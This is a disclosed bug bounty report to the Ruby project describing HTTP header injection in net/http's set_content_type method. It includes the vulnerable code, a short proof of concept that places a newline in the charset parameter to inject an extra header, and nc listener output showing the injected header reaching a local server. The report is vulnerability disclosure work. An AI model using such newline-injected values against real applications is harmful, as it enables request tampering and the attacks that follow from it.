# 'net/http': HTTP Header Injection in the set_content_type method

## Report Details
- **Report ID**: 1168205
- **URL**: https://hackerone.com/reports/1168205
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-04-19T09:25:40.010Z
- **Disclosed**: 2022-02-04T06:31:47.596Z

## Reporter
- **Username**: sighook
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
The set\_content\_type's parameter is not filtered to prevent the injection from altering the entire request.

The vulnerable code:
```ruby
  def set_content_type(type, params = {})
    @header['content-type'] = [type + params.map{|k,v|"; #{k}=#{v}"}.join('')]
  end
```

# PoC

1.
```ruby
require 'net/http'

uri = URI('http://127.0.0.1:8080')
req = Net::HTTP::Post.new(uri)
req.set_content_type('text/html', "charset" => "iso-8859-1\nHeader:Inject")

resp = Net::HTTP.start(uri.hostname, uri.port) do |http|
  http.request(req)
end
```

2.
```
$ nc -lvp 8080
Listening on 0.0.0.0 8080
Connection received on localhost 57620
POST / HTTP/1.1
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
Host: 127.0.0.1:8080
Content-Type: text/html; charset=iso-8859-1
Header:Inject # <<<<<<<<
Content-Length: 0
```

I set the same severity as [CVE-2020-26116](https://nvd.nist.gov/vuln/detail/CVE-2020-26116) has.

## Impact

In web applications a CRLF injection can have severe impacts, depending on what the application does with single items. Impacts can range from information disclosure to code execution, a direct impact web application security vulnerability.

## Attachments
No attachments
